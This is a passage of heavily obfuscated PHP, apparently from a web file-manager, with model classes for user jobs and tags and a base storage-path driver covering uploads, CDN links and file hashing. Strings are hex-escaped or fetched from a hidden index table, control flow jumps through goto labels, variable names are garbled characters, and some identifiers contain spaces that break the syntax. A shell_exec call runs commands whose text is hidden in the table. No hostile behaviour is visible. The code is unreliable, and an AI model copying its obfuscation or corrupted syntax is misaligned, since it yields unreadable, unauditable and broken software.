$‘ëéïÓ[$ğ÷÷–Áø]; $this->where($ôÎëé‡İ)->save(array($º©º¶—å[1813] => $ğ÷÷–Áø + 1)); } return !0; } protected function moveTop($¢†°§‡) { $ó®¸ÜÀ =& $_SERVER[ê‘³Æ±]; $åüš´Ñ = array($ó®¸ÜÀ[1632] => USER_ID, $ó®¸ÜÀ[476] => 0); $§¾Õ€àÛ = $this->where($åüš´Ñ)->where(array($ó®¸ÜÀ[32] => $¢†°§‡))->find(); if (!$§¾Õ€àÛ) { return; } $„‹é¢òè = $this->field($ó®¸ÜÀ[394])->where($åüš´Ñ)->order($ó®¸ÜÀ[2238])->select(); $„‹é¢òè = array_to_keyvalue($„‹é¢òè, $ó®¸ÜÀ[12], $ó®¸ÜÀ[394]); $æàáÏ“ = $„‹é¢òè; $„‹é¢òè = array_remove_value($„‹é¢òè, $§¾Õ€àÛ[$ó®¸ÜÀ[394]]); array_unshift($„‹é¢òè, $§¾Õ€àÛ[$ó®¸ÜÀ[394]]); return $this->resetSort($„‹é¢òè); } protected function moveBottom($´ƒ¼¥Ÿ) { $©Ú¾åëˆ =& $_SERVER[ê‘³Æ±]; $Êá¿™ù³ = array($©Ú¾åëˆ[1632] => USER_ID, $©Ú¾åëˆ[476] => 0); $‰÷ó³Í´ = $this->where($Êá¿™ù³)->max($©Ú¾åëˆ[1832]); $æ¼‹ùıÂ = array($©Ú¾åëˆ[1832] => $‰÷ó³Í´ + 1); return $this->where($Êá¿™ù³)->where(array($©Ú¾åëˆ[32] => $´ƒ¼¥Ÿ))->save($æ¼‹ùıÂ); } private function getAutoName($ÙíÆÉ¢›) { $ã²È¨âé =& $_SERVER[ê‘³Æ±]; $Õõèêøˆ = array($ã²È¨âé[1632] => USER_ID, $ã²È¨âé[476] => 0); $À­ÜŞÏ = $this->field($ã²È¨âé[32])->where($Õõèêøˆ)->select(); $À­ÜŞÏ = array_to_keyvalue($À­ÜŞÏ, $ã²È¨âé[12], $ã²È¨âé[32]); if (!$À­ÜŞÏ || !in_array($ÙíÆÉ¢›, $À­ÜŞÏ)) { return $ÙíÆÉ¢›; } for ($ğƒòÜÑË = 0; $ğƒòÜÑË < count($À­ÜŞÏ); $ğƒòÜÑË++) { if (!in_array($ÙíÆÉ¢› . "\50{$ğƒòÜÑË}\51", $À­ÜŞÏ)) { return $ÙíÆÉ¢› . "\x28{$ğƒòÜÑË}\51"; } } return $ÙíÆÉ¢› . "\x28{$ğƒòÜÑË}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\152\x6f\x62\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\144\x65\x73\143", "\x73\157\162\x74"); const JOB_KEY = "\163\x65\x6c\146\x4a\157\142\x4c\x69\x73\164"; public function listData($ŠïÜ£”¸ = false, $‰Á³¡ = "\163\157\162\164", $´ìãß³Å = false) { return parent::listData($ŠïÜ£”¸, $‰Á³¡, $´ìãß³Å); } public function remove($ÒŸ­’˜¤) { return parent::remove($ÒŸ­’˜¤); } public function add($Å¥ÁÌ‰) { $‹‘äÒ =& $_SERVER[ê‘³Æ±]; if ($this->findByName($Å¥ÁÌ‰[$‹‘äÒ[32]])) { return !1; } $Å¥ÁÌ‰[$‹‘äÒ[1832]] = $this->getSort(); return parent::insert($Å¥ÁÌ‰); } private function getSort() { $ª´‚®»´ =& $_SERVER[ê‘³Æ±]; $ÃÏğùÎÑ = parent::listData(); $Û£¡¡Ôã = array_to_keyvalue($ÃÏğùÎÑ, $ª´‚®»´[12], $ª´‚®»´[1832]); return empty($Û£¡¡Ôã) ? 0 : max($Û£¡¡Ôã) + 1; } public function update($¶îäœ·Ë, $«šØùä‘) { $‚¬éõ˜Ò =& $_SERVER[ê‘³Æ±]; $…Å€¼Öş = parent::listData($¶îäœ·Ë); $æ‚ù— · = $this->findByName($«šØùä‘[$‚¬éõ˜Ò[32]]); if (!$…Å€¼Öş || $æ‚ù— · && $æ‚ù— ·[$‚¬éõ˜Ò[394]] != $…Å€¼Öş[$‚¬éõ˜Ò[394]]) { return !1; } return parent::update($¶îäœ·Ë, $«šØùä‘); } public function setUserJob($Ííô×£ì, $©”ôÑ×) { $½“œëìŸ =& $_SERVER[ê‘³Æ±]; if (!is_array($©”ôÑ×)) { $©”ôÑ× = array($©”ôÑ×); } $¯£§³‡É = parent::listData(); $çä¤¸æÊ = array_to_keyvalue($¯£§³‡É, $½“œëìŸ[32]); $¶ÎÍ•Å = $½“œëìŸ[375]; foreach ($©”ôÑ× as $†”äÃ§¨) { if ($çä¤¸æÊ[$†”äÃ§¨]) { $¶ÎÍ•Å .= $çä¤¸æÊ[$†”äÃ§¨][$½“œëìŸ[394]] . $½“œëìŸ[50]; } else { $¸«îÂ = $this->add($†”äÃ§¨); $¶ÎÍ•Å .= $¸«îÂ . $½“œëìŸ[50]; } } $¶ÎÍ•Å = rtrim($¶ÎÍ•Å, $½“œëìŸ[50]); Model($½“œëìŸ[534])->metaSet($Ííô×£ì, self::JOB_KEY, $¶ÎÍ•Å); } public function getUserJob($‚Íàã£) { $Şò˜½ãğ = Model($_SERVER[ê‘³Æ±][534])->metaGet($‚Íàã£); return $this->getUserJobInfo($Şò˜½ãğ[self::JOB_KEY]); } public function getUserJobInfo($„¶µùš“) { $æ¦Î®Ëµ =& $_SERVER[ê‘³Æ±]; $°ÉÇ»‰Š = explode($æ¦Î®Ëµ[50], $„¶µùš“); $™Ê²ƒüÃ = parent::listData(); $™Ê²ƒüÃ = array_remove_key($™Ê²ƒüÃ, $æ¦Î®Ëµ[195]); $–×ãñ‚ = array(); foreach ($°ÉÇ»‰Š as $ö¢­óÊœ) { if (isset($™Ê²ƒüÃ[$ö¢­óÊœ])) { $–×ãñ‚[] = $™Ê²ƒüÃ[$ö¢­óÊœ]; } } return $–×ãñ‚; } } goto a×ÎŠœ¡õ; BÛÑ»²Ï: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\x74\141\147\114\151\163\x74"; public $modelType = "\125\163\145\162\117\160\x74\x69\x6f\156"; public $field = array("\x6e\x61\155\145", "\x73\164\171\x6c\145", "\163\157\x72\x74"); public function listData($—Şü× = false, $Í„Íéú = "\163\157\162\164", $¥û€õÊƒ = false) { return parent::listData($—Şü×, $Í„Íéú, $¥û€õÊƒ); } public function remove($³İÇ) { return parent::remove($³İÇ); } public function add($Ã„˜×¯¶, $Õóê ë¡ = "\154\141\142\x65\154\55\x67\x72\x65\171\x2d\156\157\162\x6d\141\x6c") { $­ñ¬›‘ =& $_SERVER[ê‘³Æ±]; if ($this->findByName($Ã„˜×¯¶)) { return !1; } $³Ã¿¼ëú = array($­ñ¬›‘[414] => $Ã„˜×¯¶, $­ñ¬›‘[477] => $Õóê ë¡, $­ñ¬›‘[1813] => $this->getSort($­ñ¬›‘[255]) + 1); return parent::insert($³Ã¿¼ëú); } public function update($ßõ§Çä , $×üÜ) { $èİĞ÷¡ç =& $_SERVER[ê‘³Æ±]; $«²‚ïÏ = $this->listData($ßõ§Çä ); $·•ûËÙ¤ = $this->findByName($×üÜ[$èİĞ÷¡ç[32]]); if (!$«²‚ïÏ || $·•ûËÙ¤ && $·•ûËÙ¤[$èİĞ÷¡ç[394]] != $«²‚ïÏ[$èİĞ÷¡ç[394]]) { return !1; } return parent::update($ßõ§Çä , $×üÜ); } public function moveTop($êá³Œ†­) { $×¡€ ‰ =& $_SERVER[ê‘³Æ±]; $¾¡—Æó“ = parent::listData(); $¨ÒÂÕ¾ı = $this->getSort($×¡€ ‰[254]); foreach ($¾¡—Æó“ as &$±æ—…Ã) { if ($±æ—…Ã[$×¡€ ‰[394]] == $êá³Œ†­) { $±æ—…Ã[$×¡€ ‰[1832]] = $¨ÒÂÕ¾ı; continue; } $±æ—…Ã[$×¡€ ‰[1832]] += 1; } unset($±æ—…Ã); return parent::resetData($¾¡—Æó“); } public function moveBottom($€ç¿ö‘) { $Çë·§° =& $_SERVER[ê‘³Æ±]; $ôÕ´ÙÎ = $this->getSort($Çë·§°[255]) + 1; return parent::update($€ç¿ö‘, array($Çë·§°[1832] => $ôÕ´ÙÎ)); } public function resetSort($ı»­”ùÖ) { $Ï¿¡é«½ =& $_SERVER[ê‘³Æ±]; $×‚Ú†Àù = array(); $ı»­”ùÖ = is_array($ı»­”ùÖ) ? $ı»­”ùÖ : array(); for ($¸ŞšÄÏ÷ = 0; $¸ŞšÄÏ÷ < count($ı»­”ùÖ); $¸ŞšÄÏ÷++) { $×‚Ú†Àù[$ı»­”ùÖ[$¸ŞšÄÏ÷] . $Ï¿¡é«½[12]] = $¸ŞšÄÏ÷ + 1; } $ìãô¼Ì‹ = parent::listData(); foreach ($ìãô¼Ì‹ as &$â´ÃŒÌê) { $½Ååˆó± = $×‚Ú†Àù[$â´ÃŒÌê[$Ï¿¡é«½[394]]]; $â´ÃŒÌê[$Ï¿¡é«½[1832]] = $½Ååˆó± ? $½Ååˆó± : $â´ÃŒÌê[$Ï¿¡é«½[1832]]; } unset($â´ÃŒÌê); return parent::resetData($ìãô¼Ì‹); } private function getSort($Æ¾†¼Ì£) { $¡•ïµŸ¾ =& $_SERVER[ê‘³Æ±]; $‘ÂÂÌ€ø = parent::listData(); $ÀãÛ€Çš = array_to_keyvalue($‘ÂÂÌ€ø, $¡•ïµŸ¾[12], $¡•ïµŸ¾[1832]); if (!$ÀãÛ€Çš) { $ÀãÛ€Çš = array(0); } $â¯öü—Ú = $Æ¾†¼Ì£ == $¡•ïµŸ¾[255] ? max($ÀãÛ€Çš) : min($ÀãÛ€Çš); return intval($â¯öü—Ú); } } goto A—Ï´Œöèå; Dš¶Õˆ®•: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $ñÕ™‚ªØ =& $_SERVER[ê‘³Æ±]; $this->objectDriver = array($ñÕ™‚ªØ[60], $ñÕ™‚ªØ[61], $ñÕ™‚ªØ[62], $ñÕ™‚ªØ[63], $ñÕ™‚ªØ[64], $ñÕ™‚ªØ[65], $ñÕ™‚ªØ[66], $ñÕ™‚ªØ[67], $ñÕ™‚ªØ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Í¸ó¼ö¶) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Í¸ó¼ö¶, $_SERVER[ê‘³Æ±][8]); } return $Í¸ó¼ö¶; } public function iconvApp($–“Š²ØŒ) { return $–“Š²ØŒ; } public function iconvSystem($œÉ“¿Û) { return $œÉ“¿Û; } public function iconvTo($õ‹©”, $ùÎ¹ø¬, $’öÀ­ó) { $¬òÏïŠŠ =& $_SERVER[ê‘³Æ±]; if (!$õ‹©” || !function_exists($¬òÏïŠŠ[69])) { return $õ‹©”; } static $»©ƒšªü = array(); $Øğ«² = $ùÎ¹ø¬ . $¬òÏïŠŠ[70] . $’öÀ­ó . $¬òÏïŠŠ[71] . $õ‹©”; if (isset($»©ƒšªü[$Øğ«²])) { return $»©ƒšªü[$Øğ«²]; } if (function_exists($¬òÏïŠŠ[72])) { $ğ™Çü¤¢ = @mb_convert_encoding($õ‹©”, $’öÀ­ó, $ùÎ¹ø¬); } else { $ğ™Çü¤¢ = @iconv($ùÎ¹ø¬, $’öÀ­ó, $õ‹©”); } $ğ™Çü¤¢ = $ğ™Çü¤¢ ? $ğ™Çü¤¢ : $õ‹©”; if (strstr($ğ™Çü¤¢, $¬òÏïŠŠ[73])) { $ğ™Çü¤¢ = str_replace($¬òÏïŠŠ[73], $¬òÏïŠŠ[11], $ğ™Çü¤¢); } $»©ƒšªü[$ùÎ¹ø¬ . $¬òÏïŠŠ[70] . $’öÀ­ó . $¬òÏïŠŠ[71] . $õ‹©”] = $ğ™Çü¤¢; $»©ƒšªü[$’öÀ­ó . $¬òÏïŠŠ[70] . $ùÎ¹ø¬ . $¬òÏïŠŠ[71] . $õ‹©”] = $õ‹©”; $»©ƒšªü[$’öÀ­ó . $¬òÏïŠŠ[70] . $ùÎ¹ø¬ . $¬òÏïŠŠ[71] . $ğ™Çü¤¢] = $õ‹©”; $»©ƒšªü[$ùÎ¹ø¬ . $¬òÏïŠŠ[70] . $’öÀ­ó . $¬òÏïŠŠ[71] . $ğ™Çü¤¢] = $ğ™Çü¤¢; return $ğ™Çü¤¢; } public function getPathInner($Û¬¬Á·©) { $Î¾¬²ÜÇ = IO::init($Û¬¬Á·©); return $Î¾¬²ÜÇ->path; } public function getPathOuter($ÄŒ„ç¥Æ) { $¢ÍÑïú‹ =& $_SERVER[ê‘³Æ±]; $×´Üõ¶Ü = strlen(trim($this->pathBase, $¢ÍÑïú‹[8])); $ÄŒ„ç¥Æ = substr(trim($ÄŒ„ç¥Æ, $¢ÍÑïú‹[8]), $×´Üõ¶Ü); return $this->pathDriver . $¢ÍÑïú‹[8] . ltrim($ÄŒ„ç¥Æ, $¢ÍÑïú‹[8]); } public function isParentOf($õŞ¬ÔˆÑ, $¬›ÚšŸ“) { $ôĞ°— =& $_SERVER[ê‘³Æ±]; $õŞ¬ÔˆÑ = rtrim(strtolower($õŞ¬ÔˆÑ), $ôĞ°—[8]) . $ôĞ°—[8]; $¬›ÚšŸ“ = rtrim(strtolower($¬›ÚšŸ“), $ôĞ°—[8]) . $ôĞ°—[8]; $Ÿåè¢°Â = strpos($¬›ÚšŸ“, $õŞ¬ÔˆÑ) === 0; return $Ÿåè¢°Â; } public function getType() { $ªãÊ”ï =& $_SERVER[ê‘³Æ±]; $öÉğ¶ = str_replace($ªãÊ”ï[74], $ªãÊ”ï[12], get_class($this)); return strtolower($öÉğ¶); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($’·Ùª‹ö, $Òøü¾°É) { $˜ëáè =& $_SERVER[ê‘³Æ±]; $Öõõàóï = rtrim($’·Ùª‹ö, $˜ëáè[8]) . $˜ëáè[8] . $Òøü¾°É; $¹Æ‰ÙÙ½ = $this->exist($Öõõàóï); return $¹Æ‰ÙÙ½ ? $Öõõàóï : !1; } public function setModifyTime($Ã¦¢ö, $œ¦ÏÌ¬‘ = '') { } public function renameObject($ĞŞ¨ŞÏ², $Ú´Ùø€) { $É˜¾»¡ =& $_SERVER[ê‘³Æ±]; $ñÂÄüŸå = $Ú´Ùø€; Hook::trigger($É˜¾»¡[75], $this, $ĞŞ¨ŞÏ², $this, $this->pathFather($ĞŞ¨ŞÏ²) . $Ú´Ùø€); $ĞŞ¨ŞÏ² = $this->getPathOuter($ĞŞ¨ŞÏ²); $Ú´Ùø€ = $this->pathFather($ĞŞ¨ŞÏ²) . $Ú´Ùø€; if (IO::isFile($ĞŞ¨ŞÏ²)) { $–“Ôòá¢ = IO::copy($ĞŞ¨ŞÏ², $this->pathFather($ĞŞ¨ŞÏ²), REPEAT_RENAME_FOLDER, $ñÂÄüŸå); if ($–“Ôòá¢) { IO::remove($ĞŞ¨ŞÏ²); } } else { $–“Ôòá¢ = IO::mkdir($Ú´Ùø€); if (!$–“Ôòá¢) { return !1; } $¨‚è˜øø = IO::listPath($ĞŞ¨ŞÏ², !0); $ı´¨šÖ² = array_merge($¨‚è˜øø[$É˜¾»¡[76]], $¨‚è˜øø[$É˜¾»¡[77]]); foreach ($ı´¨šÖ² as $–ÅÇè°õ) { IO::move($–ÅÇè°õ[$É˜¾»¡[78]], $Ú´Ùø€, REPEAT_RENAME_FOLDER); } IO::remove($ĞŞ¨ŞÏ²); } return $–“Ôòá¢ ? $Ú´Ùø€ : !1; } public function tempFile($ƒˆıí®Ğ = '', $œîÔÏ½ò = '') { if (!$ƒˆıí®Ğ) { $ƒˆıí®Ğ = rand_string(15); } $üåòıºü = TEMP_FILES . rand_string(15) . $_SERVER[ê‘³Æ±][8]; @mkdir($üåòıºü, DEFAULT_PERRMISSIONS, !0); $™©ÚÙ = $üåòıºü . $ƒˆıí®Ğ; @touch($™©ÚÙ); if ($œîÔÏ½ò) { file_put_contents($™©ÚÙ, $œîÔÏ½ò); } return $™©ÚÙ; } public function tempFileRemve($‚²¶¼à×) { @unlink($‚²¶¼à×); @rmdir($this->pathFather($‚²¶¼à×)); } public function mkfile($Ó•ìŠµö, $û˜ş£Š… = '', $Å¥‹‚Ø¬ = REPEAT_RENAME) { } public function mkdir($ ŠÀ§ĞÁ, $¤ºÆœÜ™ = REPEAT_SKIP) { } public function delFile($à÷êéü¥) { } public function delFolder($šÍæ«Ã) { } public function copyFile($ğÉ€øì, $´±øœ—ş) { } public function moveFile($èñ¦éÏ, $„ÃøŸü) { } public function remove($‹á‡ãÊ) { if ($this->isFile($‹á‡ãÊ)) { return $this->delFile($‹á‡ãÊ); } return $this->delFolder($‹á‡ãÊ); } public function rename($ÇõÕ˜°›, $ŞŠñó­ğ) { } public function exist($Âîëõ¬) { } public function findByHash($õÌª˜ı = '', $ôº±òí¯ = '') { return !1; } public function isFile($©‡••ş) { } public function isFolder($¼Ñğå«á) { } public function size($×Æ¬ëºÉ) { } public function info($ÈÙ¢àÇ¹) { } public function infoSimple($¬Ù°¡‘) { return $this->info($¬Ù°¡‘); } public function infoAuth($ôØº ¡–) { return $this->info($ôØº ¡–); } public function infoFull($½õ–’àÂ) { return $this->info($½õ–’àÂ); } public function infoWithChildren($Òà¥”İ´) { $¢àŠ¼²ê =& $_SERVER[ê‘³Æ±]; static $ã‘ÉÖ = array(); if (isset($ã‘ÉÖ[$Òà¥”İ´])) { return $ã‘ÉÖ[$Òà¥”İ´]; } $ÈÃ³Şø = $this->info($Òà¥”İ´); if ($ÈÃ³Şø && $ÈÃ³Şø[$¢àŠ¼²ê[33]] == $¢àŠ¼²ê[79]) { $¸ÄıéÏ = array($¢àŠ¼²ê[80] => 0, $¢àŠ¼²ê[81] => 0, $¢àŠ¼²ê[82] => 0); $this->infoChildren($Òà¥”İ´, $¸ÄıéÏ); $ÈÃ³Şø[$¢àŠ¼²ê[80]] = $¸ÄıéÏ[$¢àŠ¼²ê[80]]; $ÈÃ³Şø[$¢àŠ¼²ê[83]] = array($¢àŠ¼²ê[84] => $¸ÄıéÏ[$¢àŠ¼²ê[81]], $¢àŠ¼²ê[85] => $¸ÄıéÏ[$¢àŠ¼²ê[82]]); $ã‘ÉÖ[$Òà¥”İ´] = $ÈÃ³Şø; } return $ÈÃ³Şø; } public function listPath($»úêô‹, $ÜÌ¹’Ô¼ = false) { } public function has($Šƒ´½Ëº, $øÒ„·ù¯ = false, $Å¡Ñõ = false) { } public function canRead($¢Õìüî¤) { } public function canWrite($ßä¡­¤ı) { } public function getContent($Ô¡®ğ”Æ) { } public function setContent($‘øÍáÎí, $ƒÛŒÅÑ = '') { } protected function infoChildren($àù×°·, &$ËÑ¹”) { $ÅüÂÒ½ƒ =& $_SERVER[ê‘³Æ±]; check_abort_echo(); $ì®÷ïÊ = $this->listPath($àù×°·, !0); $ì®÷ïÊ = array_merge($ì®÷ïÊ[$ÅüÂÒ½ƒ[77]], $ì®÷ïÊ[$ÅüÂÒ½ƒ[76]]); foreach ($ì®÷ïÊ as $ç„ñÌ’¦) { if ($ç„ñÌ’¦[$ÅüÂÒ½ƒ[33]] == $ÅüÂÒ½ƒ[79]) { $ËÑ¹”[$ÅüÂÒ½ƒ[82]]++; $œò¼¡¸„ = $this->getPathInner($ç„ñÌ’¦[$ÅüÂÒ½ƒ[78]]); $this->infoChildren($œò¼¡¸„, $ËÑ¹”); } else { $ËÑ¹”[$ÅüÂÒ½ƒ[81]]++; $ËÑ¹”[$ÅüÂÒ½ƒ[80]] += $ç„ñÌ’¦[$ÅüÂÒ½ƒ[80]]; } } } public function fileSubstr($øäÌı¥, $û»Ş‰½„, $ë˜ö‡Œ) { } public function listAll($İÎ©ø¦¯) { } public function listAllMake($«Â÷ÄÀ, &$ŒÊ³ÚÈ) { $™Á­˜Ö =& $_SERVER[ê‘³Æ±]; check_abort_echo(); $ğÀ†…ºî = $this->listPath($«Â÷ÄÀ, !0); if (!$ğÀ†…ºî) { return; } $î¾Í©ÃÆ = array_merge($ğÀ†…ºî[$™Á­˜Ö[77]], $ğÀ†…ºî[$™Á­˜Ö[76]]); foreach ($î¾Í©ÃÆ as $‡æğêû£) { $Œ…‹¢¾ˆ = $‡æğêû£[$™Á­˜Ö[33]] == $™Á­˜Ö[79]; $ÙË Ã• = array($™Á­˜Ö[78] => $‡æğêû£[$™Á­˜Ö[78]], $™Á­˜Ö[79] => $Œ…‹¢¾ˆ); if (isset($‡æğêû£[$™Á­˜Ö[80]])) { $ÙË Ã•[$™Á­˜Ö[80]] = $‡æğêû£[$™Á­˜Ö[80]]; } if (isset($‡æğêû£[$™Á­˜Ö[86]])) { $ÙË Ã•[$™Á­˜Ö[86]] = $‡æğêû£[$™Á­˜Ö[86]]; } if (!$Œ…‹¢¾ˆ) { $ŒÊ³ÚÈ[] = $ÙË Ã•; continue; } $ŒÊ³ÚÈ[] = $ÙË Ã•; $Æ½‹˜‚¥ = $‡æğêû£[$™Á­˜Ö[78]]; $Ê¼üéı× = $this->pathDriver; if (substr($‡æğêû£[$™Á­˜Ö[78]], 0, strlen($Ê¼üéı×)) == $Ê¼üéı×) { $Æ½‹˜‚¥ = substr($Æ½‹˜‚¥, strlen($Ê¼üéı×)); } $this->listAllMake($Æ½‹˜‚¥, $ŒÊ³ÚÈ); } } public function listAllSimple($£÷Ë¿°õ) { $ÃŸê¯„é =& $_SERVER[ê‘³Æ±]; $ÁÙœğÂ× = array(); $åÚÜ¤ = $this->listAll($£÷Ë¿°õ); $¤Í°æº÷ = $this->getPathOuter($£÷Ë¿°õ); foreach ($åÚÜ¤ as $–É¡³İû) { $ñµç¥¤¡ = $–É¡³İû[$ÃŸê¯„é[78]]; $È¿¯èı‘ = $–É¡³İû[$ÃŸê¯„é[78]]; if (isset($–É¡³İû[$ÃŸê¯„é[87]])) { $ñµç¥¤¡ = $–É¡³İû[$ÃŸê¯„é[87]][$ÃŸê¯„é[78]]; $–É¡³İû[$ÃŸê¯„é[80]] = $–É¡³İû[$ÃŸê¯„é[87]][$ÃŸê¯„é[80]]; $–É¡³İû[$ÃŸê¯„é[86]] = $–É¡³İû[$ÃŸê¯„é[87]][$ÃŸê¯„é[86]]; } else { $È¿¯èı‘ = substr($–É¡³İû[$ÃŸê¯„é[78]], strlen(get_path_father($¤Í°æº÷))); $È¿¯èı‘ = $ÃŸê¯„é[8] . ltrim($È¿¯èı‘, $ÃŸê¯„é[8]); } $’•áúÇÎ = array($ÃŸê¯„é[78] => $È¿¯èı‘, $ÃŸê¯„é[79] => $–É¡³İû[$ÃŸê¯„é[79]]); if (isset($–É¡³İû[$ÃŸê¯„é[80]]) && !$–É¡³İû[$ÃŸê¯„é[79]]) { $’•áúÇÎ[$ÃŸê¯„é[80]] = $–É¡³İû[$ÃŸê¯„é[80]]; } if (isset($–É¡³İû[$ÃŸê¯„é[86]])) { $’•áúÇÎ[$ÃŸê¯„é[86]] = $–É¡³İû[$ÃŸê¯„é[86]]; } if (!$–É¡³İû[$ÃŸê¯„é[79]]) { $’•áúÇÎ[$ÃŸê¯„é[88]] = $ñµç¥¤¡; } $ÁÙœğÂ×[] = $’•áúÇÎ; } return $ÁÙœğÂ×; } public function upload($¬íë¥Ì´, $­¾ı“, $¥™‚±„› = false, $ñ»äÁ®¯ = REPEAT_REPLACE) { } public function uploadFileByID($¡ ìæµ†, $Şïß½Ì¤, $©Û¯Üİ) { } public function uploadFileByPath($…×í¯”ş, $Ñ—•—ñŠ, $£“îÜèò = array()) { } public function isUploadServer() { $»öÔ®‡ô =& $_SERVER[ê‘³Æ±]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $»öÔ®‡ô[89]) { return !0; } return $GLOBALS[$»öÔ®‡ô[6]][$»öÔ®‡ô[90]][$»öÔ®‡ô[91]]; } public function isFileOutServer() { $¶‘ëñ‘ =& $_SERVER[ê‘³Æ±]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¶‘ëñ‘[89]) { return !0; } return $GLOBALS[$¶‘ëñ‘[6]][$¶‘ëñ‘[90]][$¶‘ëñ‘[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¥ĞÌ¶ÀŒ) { $À¬„µï× =& $_SERVER[ê‘³Æ±]; if (!$this->isCdnHost()) { return $¥ĞÌ¶ÀŒ; } return str_replace(trim(get_url_root($¥ĞÌ¶ÀŒ), $À¬„µï×[8]), trim($this->cdnHost, $À¬„µï×[8]), $¥ĞÌ¶ÀŒ); } public function uploadLink($¿ê·ıî, $¤’‰Ïõ = 0) { $¨‘Ö¿¦Š =& $_SERVER[ê‘³Æ±]; if ($this->isUploadServer()) { return; } $…‚à›ÁÄ = $this->getType(); if (!in_array($…‚à›ÁÄ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $İ§ü‘Ü‚ = 1024 * 1024 * 10; $‚îŠş¢å = $¤’‰Ïõ <= $İ§ü‘Ü‚ ? $¨‘Ö¿¦Š[93] : $¨‘Ö¿¦Š[94]; $¤í–ˆ¯¾ = (!$¤’‰Ïõ ? 1 : ceil($¤’‰Ïõ / pow(1024, 3))) * 3600 * 4; $æ—â–ÇË = $this->{$‚îŠş¢å}($¿ê·ıî, $¤í–ˆ¯¾); if ($æ—â–ÇË) { $æ—â–ÇË[$¨‘Ö¿¦Š[95]] = $¿ê·ıî; $æ—â–ÇË[$¨‘Ö¿¦Š[96]] = $…‚à›ÁÄ; } return $æ—â–ÇË; } public function uploadFormData($òşëûĞ, $—ìº³…È = 3600) { } public function multiUploadFormData($§ûˆ’»¡, $€ßãêëü = 3600) { } public function download($¿ïÉÁ¢³, $³—œ§×) { } public function ext($é»î¼Í) { $Ñ¼÷ €÷ =& $_SERVER[ê‘³Æ±]; if (strpos($é»î¼Í, $Ñ¼÷ €÷[8]) === -1) { $¬¯ŸíêÇ = $é»î¼Í; } else { $¬¯ŸíêÇ = $this->pathThis($é»î¼Í); } $¸à¥¥ùª = $Ñ¼÷ €÷[12]; if (strstr($¬¯ŸíêÇ, $Ñ¼÷ €÷[10])) { $¸à¥¥ùª = substr($¬¯ŸíêÇ, strrpos($¬¯ŸíêÇ, $Ñ¼÷ €÷[10]) + 1); $¸à¥¥ùª = strtolower($¸à¥¥ùª); } if (strlen($¸à¥¥ùª) > 3 && preg_match($Ñ¼÷ €÷[97], $¸à¥¥ùª, $Û…İ¯ô•)) { $¸à¥¥ùª = $Ñ¼÷ €÷[12]; } return $¸à¥¥ùª; } public function pathThis($…®¤‹ô) { $æòî´õ´ =& $_SERVER[ê‘³Æ±]; $…®¤‹ô = str_replace($æòî´õ´[98], $æòî´õ´[8], rtrim($…®¤‹ô, $æòî´õ´[8])); $˜Â’—âì = strrpos($…®¤‹ô, $æòî´õ´[8]); if ($˜Â’—âì === !1) { return $…®¤‹ô; } return substr($…®¤‹ô, $˜Â’—âì + 1); } public function pathFather($¦×¬êŠÇ) { $íŒ«Æ¿Ë =& $_SERVER[ê‘³Æ±]; $¦×¬êŠÇ = str_replace($íŒ«Æ¿Ë[98], $íŒ«Æ¿Ë[8], rtrim($¦×¬êŠÇ, $íŒ«Æ¿Ë[8])); $º—È›€ = strrpos($¦×¬êŠÇ, $íŒ«Æ¿Ë[8]); if ($º—È›€ === !1) { return $íŒ«Æ¿Ë[12]; } return substr($¦×¬êŠÇ, 0, $º—È›€ + 1); } public function hashSimple($¡‹·‡å) { $€øÈïñ½ =& $_SERVER[ê‘³Æ±]; if (!$¡‹·‡å) { return md5($€øÈïñ½[12]); } $óÖÖïæ = $this->size($¡‹·‡å); $ØÊşİ‚ = 200; $ºÛ“€Æ = 50; if ($óÖÖïæ <= $ØÊşİ‚ * $ºÛ“€Æ) { return $this->hashMd5($¡‹·‡å) . $óÖÖïæ; } $ãùòêö = intval($óÖÖïæ / $ºÛ“€Æ); $ƒ”‚‹³Í = $€øÈïñ½[12]; for ($ğâİéË— = 0; $ğâİéË— < $ºÛ“€Æ; $ğâİéË—++) { $ƒ”‚‹³Í .= $this->fileSubstr($¡‹·‡å, $ãùòêö * $ğâİéË—, $ØÊşİ‚); } $ƒ”‚‹³Í .= $this->fileSubstr($¡‹·‡å, $óÖÖïæ - $ØÊşİ‚, $ØÊşİ‚); return md5($ƒ”‚‹³Í) . $óÖÖïæ; } public static $md5Cache = array(); public function hashMd5($ãáµÛÉş) { if (!$ãáµÛÉş) { return md5($_SERVER[ê‘³Æ±][12]); } $ãáµÛÉş = $this->iconvSystem($ãáµÛÉş); if (isset(self::$md5Cache[$ãáµÛÉş])) { return self::$md5Cache[$ãáµÛÉş]; } self::$md5Cache[$ãáµÛÉş] = $this->hashMd5Shell($ãáµÛÉş); if (!self::$md5Cache[$ãáµÛÉş]) { self::$md5Cache[$ãáµÛÉş] = @md5_file($ãáµÛÉş); } return self::$md5Cache[$ãáµÛÉş]; } private function hashMd5Shell($ıÄ¡ßå°) { $™ò¶ø =& $_SERVER[ê‘³Æ±]; if (!$ıÄ¡ßå°) { return md5($™ò¶ø[12]); } if (!function_exists($™ò¶ø[99])) { return !1; } $°ûøé¹¶ = array($™ò¶ø[100], $™ò¶ø[101]); $ñÆ´Éª = Cache::get($™ò¶ø[102]); if (!$ñÆ´Éª) { $¼ô°ÌÉ´ = BASIC_PATH . $™ò¶ø[103]; $˜âÔ©ª© = md5_file($¼ô°ÌÉ´); $ñÆ´Éª = $™ò¶ø[104]; foreach ($°ûøé¹¶ as $É©¡”„Ì) { $©èÜÑï = shell_exec($É©¡”„Ì . "\40\42{$¼ô°ÌÉ´}\x22"); if ($©èÜÑï && substr(trim($©èÜÑï), 0, 32) == $˜âÔ©ª©) { $ñÆ´Éª = $É©¡”„Ì; break; } } Cache::set($™ò¶ø[102], 